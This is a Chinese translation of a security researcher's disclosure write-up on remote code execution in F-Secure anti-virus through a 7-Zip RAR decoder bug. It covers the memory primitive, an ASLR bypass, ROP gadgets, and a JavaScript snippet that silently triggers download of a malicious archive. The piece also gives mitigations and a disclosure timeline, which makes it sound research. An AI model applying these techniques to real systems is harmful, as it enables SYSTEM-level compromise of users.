> 原文链接: https://www.anquanke.com//post/id/147198 


# F-Secure反病毒软件受7-Zip漏洞影响导致远程代码执行漏洞


                                阅读量   
                                **90277**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者landave，文章来源：landave.io
                                <br>原文地址：[https://landave.io/2018/06/f-secure-anti-virus-remote-code-execution-via-solid-rar-unpacking/](https://landave.io/2018/06/f-secure-anti-virus-remote-code-execution-via-solid-rar-unpacking/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t018e01f9ad57b76adf.jpg)](https://p1.ssl.qhimg.com/t018e01f9ad57b76adf.jpg)





## 写在前面的一些话

正如我在[上两篇](https://landave.io/2018/01/7-zip-multiple-memory-corruptions-via-rar-and-zip/)关于7-Zip的bug CVE-2017-17969、CVE-2018-5996和CVE-2018-10115的文章中简要提到的，至少有一个反病毒供应商的产品受到了这些bug的影响。现在所有补丁都已经发布，我终于可以公开供应商的名字了：它就是F-Secure，所有基于Windows的端点的保护产品（包括消费产品，如F-Secure Anti-Virus，以及企业产品，如F-Secure Server Security）。

尽管F-Secure的产品直接受到前面提到的7-Zip bug的影响，但由于F-Secure正确部署了ASLR，因此利用这些漏洞比7-Zip(18.05版之前)要困难得多。在这篇文章中，我提出了一个扩展，我[之前的7-Zip利用](https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/)CVE-2018-10115，在F-Secure的产品实现了远程代码执行。



## 介绍

在之前的7-Zip利用开发中，我演示了如何使用7-Zip的RAR头处理方法来处理堆。这并不是完全微不足道的，但在那之后，我们基本上完成了。由于7-Zip 18.01没有部署ASLR，一个完全静态的ROP链就足以实现代码执行。

使用部署ASLR的F-Secure，这样的静态ROP链不能用了，需要使用其他方法。特别是，我们需要动态地计算ROP链。在可编写脚本的环境中，这通常非常简单：只需泄漏一个指针来派生某个模块的基地址，然后将这个基地址添加到准备好的ROP链中。

由于我们试图利用的bug驻留在RAR提取代码中，一个可能的想法是使用RarVM作为一个脚本环境来计算ROP链。我非常有信心，如果RarVM真的可用的话，这将是可行的。不幸的是，事实并非如此：尽管7-Zip的RAR实现支持RarVM，但它在编译时默认是禁用的，而F-Secure也没有启用它。

虽然几乎可以肯定的是，F-Secure引擎包含一些攻击者可以控制的脚本引擎(在7-Zip模块之外)，但是似乎很难以可靠的方式利用类似的东西。此外，我的目标是找到一个独立于任何F-Secure功能的ASLR绕过方法。理想情况下，新的漏洞也适用于7-Zip(ASLR)，以及使用7-Zip作为库的任何其他软件。

接下来的内容，我将简要地介绍受攻击的bug最重要的方面。然后，我们将看到如何绕过ASLR来实现代码执行。



## Bug

我正在利用的bug在我[之前的博客文章](https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/)中有详细的解释。本质上，它是一种未初始化的内存使用，允许我们控制很大一部分RAR解码器状态。特别是，我们将使用Rar1解码器。NCompress：NRar 1：CDecoder：LongLZ1方法包含以下代码：

```
if (AvrPlcB &gt; 0x28ff) `{` distancePlace = DecodeNum(PosHf2); `}`
else if (AvrPlcB &gt; 0x6ff) `{` distancePlace = DecodeNum(PosHf1); `}`
else `{` distancePlace = DecodeNum(PosHf0); `}`
// some code omitted
for (;;) `{`
  dist = ChSetB[distancePlace &amp; 0xff];
  newDistancePlace = NToPlB[dist++ &amp; 0xff]++;
  if (!(dist &amp; 0xff)) `{` CorrHuff(ChSetB,NToPlB); `}`
  else `{` break; `}`
`}`

ChSetB[distancePlace] = ChSetB[newDistancePlace];
ChSetB[newDistancePlace] = dist;
```

这非常有用，因为uint32_t数组ChSetB和NtoPlB是完全受攻击者控制的(因为如果触发此bug，它们不会被初始化)。因此，newDifferancePlace是一个攻击者控制的uint32_t，Dist也是(受最小有效字节不能为0xff的限制)。此外，距离位置是由输入流决定的，因此它也是攻击者控制的。

这给了我们一个很好的读写原语。但是请注意，它有一些限制。特别是，所执行的操作基本上是一个交换。我们可以使用原语执行以下操作：
- 我们可以将从&amp;ChSetB[0]开始的4字节对齐32位偏移量的任意uint32_t值读入ChSetB数组。如果这样做，我们总是覆盖刚刚读取的值(因为它是一个交换)。
- 我们可以从ChSetB数组将uint32_t值写入从&amp;ChSetB[0]开始的任意4字节对齐32位偏移量。这些值可以是常量，也可以是我们之前读取到ChSetB数组中的值。在任何情况下，最小有效字节不得为0xff。此外，由于我们正在交换值，因此编写的值总是被销毁(在ChSetB数组中)，因此不能第二次写入。
最后，请注意，确定索引newDistancePlace的方式进一步限制了我们。首先，我们不能做太多这样的读/写操作，因为数组NToPlB只有256个元素。其次，如果我们预先编写一个未知的值(例如，受ASLR约束的地址的一部分)，我们可能不知道Dist&amp;0xff到底是什么，所以我们需要用所需的索引填充(可能是许多)NToPlB中的不同条目。

显然，这个基本的读写原语本身不足以绕过ASLR。还需要一个其他的方法。



## 利用方法

我们使用与7-Zip大致相同的开发策略：
1. 在包含读写原语的RAR1解码器之后，将RAR3解码器对象置于恒定距离。
1. 使用RAR3解码器将payload提取到_window缓冲区中。
1. 使用读写原语将RAR3解码器的vtable指针与_window指针交换。
回想一下，在7-Zip利用开发中，我们在步骤2中提取的payload包含stack pivot、(静态)ROP链和shellcode。显然，这种静态ROP链不能在完全ASLR的环境中工作。那么，我们如何在不事先知道任何地址的情况下，动态地将有效的ROP链提取到缓冲区中呢？



## 绕过ASLR

我们是在一个非脚本环境，但我们仍然希望通过随机偏移纠正我们的ROP链。具体来说，我们要添加64位整数.

好吧，我们可能不需要完全增加64位。通过覆盖地址中最不重要的字节来调整地址的大小就足够了。但是，请注意，这在一般情况下是行不通的。考虑&amp;f是某个函数的随机地址。如果地址是一个完全一致的随机64位值，而且我们只覆盖最不重要的字节，那么我们就不知道我们改变了多少地址。但是，如果我们不知道地址，除了d最小的字节，这个想法就会奏效。在这种情况下，我们可以安全地覆盖d最小的字节，并且我们将始终通过更改了多少地址来知道。幸运的是，Windows将每个模块加载到一个(随机)64K对齐地址。这意味着，任何代码地址的两个最不重要的字节都将是常量。

为什么这个想法对我们有用？如你所知，RAR是基于Lempel-Ziv压缩算法的。在这些算法中，编码器构建一个动态字典，其中包含较早发生在压缩流中的字节序列。如果一个字节序列正在重复，那么它可以有效地编码为对字典中相应条目的引用。

在RAR中，动态字典的概念以一种广义的形式出现。实际上，在抽象级别上，解码器在每一步执行以下两种操作中的一种：
1. PutByte(Bytevalue)，或
1. CopyBlock(distance,num)
CopyBlock操作从window缓冲区当前位置之前的距离字节开始复制num字节。这就产生了以下想法：
1. 使用读写原语写入指向Rar3 window缓冲区末尾的函数指针。这个函数指针是一些(已知的)常量c的8字节地址&amp;7z.dll+c。
1. 基址&amp;7z.dll是强随机化的，但始终是64K对齐。因此，我们可以利用本节开头所解释的思想：首先，我们选择编写两个任意字节(使用PutByte(B)的两个调用)。然后，我们从window缓冲区的末尾复制(使用CopyBlock(d，n)操作)函数指针的六个最重要的字节&amp;7z.dll+c。它们一起形成一个有效的八个字节地址，指向可执行代码。
请注意，我们正在从window缓冲区的末尾进行复制。这在一般情况下是可行的，因为源索引(Curentpos-1)-distance是按window大小计算的。但是，7-Zip实现实际上检查我们是否从大于当前位置的距离复制，如果是这样，则中止。幸运的是，可以通过使用读写原语破坏Rar3解码器的成员变量来绕过这一检查。我将它留给感兴趣的读者作为一个(简单的)练习，以弄清楚这是哪个变量，以及为什么这个变量有效。



## ROP

上一节中概述的技术允许我们编写一个ROP链，它由单个64K区域的代码中的地址组成。这样就够了吗？我们尝试编写以下ROP链：

```
// pivot stack: xchg rax, rsp;
exec_buffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec_buffer, rsp+shellcode_offset, 0x1000);
jmp exec_buffer;
```

链的关键步骤是调用Virtualalloc。我可以在F-Secure的7z.dll中表单+0xd****的偏移量处找到所有出现的jmp cs:VirtualAlloc。不幸的是，我无法找到一种简单的方法来检索Rar解码器对象中(或附近)的这种形式的指针。相反，我可以找到window +0xc****的指针，并使用以下技术将其转换为window +0xd****的指针：
1. 使用读写原语将表单+0xc*的最大可用指针交换到RAR1解码器的成员变量LCount中。
1. 让RAR 解码器处理精心编制的项，这样成员变量LCount将递增(步长为1)，直到它具有+0xd****的表单。
1. 使用读写原语将成员变量LCount交换到RAR3解码器window缓冲区的末尾(请参阅前面的部分)。
事实证明，表单+0xc****的最大可用指针大约是+0xcd000，所以我们只需要增加0x3000。

由于能够处理包含跳转到Virtualalloc的完整64K代码区域，我希望上述形式的ROP链将很容易实现。不幸的是，我根本无法做到这一点，所以我复制了另一个指向window缓冲区的指针。两个64K代码的区域，因此总共128K，足以获得所需的ROP链。尽管如此，它仍然远不够好。例如，stack pivot是这样的：

```
0xd335c # push rax; cmp eax, 0x8b480002; or byte ptr [r8 - 0x77], cl; cmp bh, bh; adc byte ptr [r8 - 0x75], cl; pop rsp; and al, 0x48; mov rbp, qword ptr [rsp + 0x50]; mov rsi, qword ptr [rsp + 0x58]; add rsp, 0x30; pop rdi; ret;
```

另一个例子是，在调用Virtualalloc之前，我们如何将寄存器R9设置为Page_EXECUTE_ReadWite(0x40)：

```
# r9 := r9 &gt;&gt; 9
0xd6e75, # pop rcx; sbb al, 0x5f; ret;
0x9, # value popped into rcx
0xcdb4d, # shr r9d, cl; mov ecx, r10d; shl edi, cl; lea eax, dword ptr [rdi - 1]; mov rdi, qword ptr [rsp + 0x18]; and eax, r9d; or eax, esi; mov rsi, qword ptr [rsp + 0x10]; ret;
```

这是可行的，因为当我们进入ROP链时，R9始终具有值0x8000。



## 整合起来

我们已经看到了一个基本的开发理念的草图。在实际执行时，你必须克服我为了避免让你太无聊而忽略的一些额外的障碍。粗略地说，基本的实施步骤如下：
1. 使用(大致)与7-Zip攻击中相同的heap massaging技术。
1. 实现一个基本的Rar1编码器来创建一个Rar1项，该项以所需的方式控制读写原语。
1. 实现一个基本的RAR3编码器，以创建一个RAR3项，该项将ROP链以及shellcode写入window缓冲区。
最后，所有条目(即使是不同的RAR版本)都可以合并到一个归档文件中，这将导致在提取它时执行代码。



## 最小化所需的用户交互

几乎所有的防病毒产品都配备了所谓的文件系统小型机，它拦截每个文件系统访问并触发引擎运行后台扫描。F-Secure的产品也能做到这一点。但是，这种自动后台扫描不会提取压缩文件。这意味着仅仅通过电子邮件向受害者发送恶意的RAR存档是不够的。如果有人这样做，受害者就必须手动触发扫描。

显然这是非常糟糕的，因为防病毒软件的目的就是扫描不可信的文件。然而，我们可以做得更好。事实证明，F-Secure的产品拦截HTTP流量，如果文件的大小最多为5MB，就会自动扫描通过HTTP接收的文件。这种自动扫描包括(默认情况下)提取压缩文件。因此，我们可以为受害者提供一个自动下载攻击文件的网页。为了默默地这样做(甚至防止用户注意到下载被触发)，我们可以发出异步HTTP请求，如下所示：

```
&lt;script&gt;
  var xhr = new XMLHttpRequest(); 
  xhr.open('GET', '/exploit.rar', true); 
  xhr.responseType = 'blob';
  xhr.send(null);
&lt;/script&gt;
```



## Demo

下面的演示视频简要介绍了在新安装和更新了且安装了F-Secure Anti-Virus(也是完全更新的，但7z.dll已被未修补版本替换，我已于2018年4月15日从F-安全安装中提取)的Windows10 RS4 64位(Build 17134.81)上运行的漏洞。

[https://landave.io/files/fsecure_rce_solidrar.webm](https://landave.io/files/fsecure_rce_solidrar.webm)

如您所见，引擎(fShoster64.exe)作为NT AUTHORITYSYSTEM运行，并且该漏洞导致它启动notepad.exe(也作为NT AUTHORITYSYSTEM)。

也许你会好奇，为什么shell代码会启动notpad.exe而不是旧的calc.exe。嗯，我试图将calc.exe作为NT AUTHORITYSYSTEM打开，但没有成功。这与利用漏洞或shellcode本身无关。它似乎不再适用于新的UWP计算器(它也无法在使用pexec64.ex-i-s时启动)。如果你知道为什么会这样，请给我发一封电子邮件。



## 总结

我们已经了解了如何利用未初始化的内存使用bug，以最少的用户交互，作为NT AUTHORITYSYSTEM来执行任意远程代码。

除了与F-Secure讨论错误和可能的解决方案，我提出了三种缓解措施，以加强他们的产品：
1. 沙盒。并确保大多数代码不会在如此高的权限下运行。
1. 停止窥探HTTP流量。这个特性是无用的。它实际上没有提供任何安全好处，因为逃避它只需要攻击者从HTTP切换到HTTPS(F-Secure不会窥探HTTPS通信-感谢上帝！)因此，这个特性只会增加他们产品的攻击面。
1. 启用现代Windows exploitation mitigations，如CFG和ACG。
最后，我想指出的是，本文所提出的开发技术与任何F-Secure特性无关。它适用于任何使用7-Zip库提取压缩RAR文件的产品，即使启用了ASLR和DEP。例如，Malwarebytes可能也受到了影响。

有任何评论，反馈，疑问，都可以在“关于”页面上找到我的电子邮件地址。



## 披露时间表
- 2018-03-06-发现了7-Zip和F-Secure产品中的漏洞(F-Secure还没有可靠的崩溃PoC)。
- 2018-03-06-向7-Zip开发商Igor Pavlov报告。
- 2018-03-11-向F-Secure报告(提供可靠的崩溃PoC)。
- 2018-04-14-MITRE分配CVE-2018-10115的错误(7-Zip).
- 2018-04-15-额外报告F-Secure，这是一个非常关键的漏洞，我有一个工作代码执行的7-Zip(只有一个ALSR绕过缺失攻击F-Secure产品的漏洞)。为F-Secure提出了一个详细的补丁，并强烈建议推出修补程序，而不等待即将到来的7-Zip更新。
- 2018-04-30-7-Zip18.05发布，修正CVE-2018-10115.
- 2018-05-22-F-通过自动更新通道发布安全修复补丁.
- 2018-05-23-附加报告F-Secure与一个完整的PoC远程代码执行的各种F-Secure产品。
- 2018-06-01-F-Secure advisory发布。
- 2018年-？-支付赏金。


## 致谢

我要感谢F-Secure小组修复了错误。此外，我要感谢KiranKrishnappa为我提供了定期的状态更新。
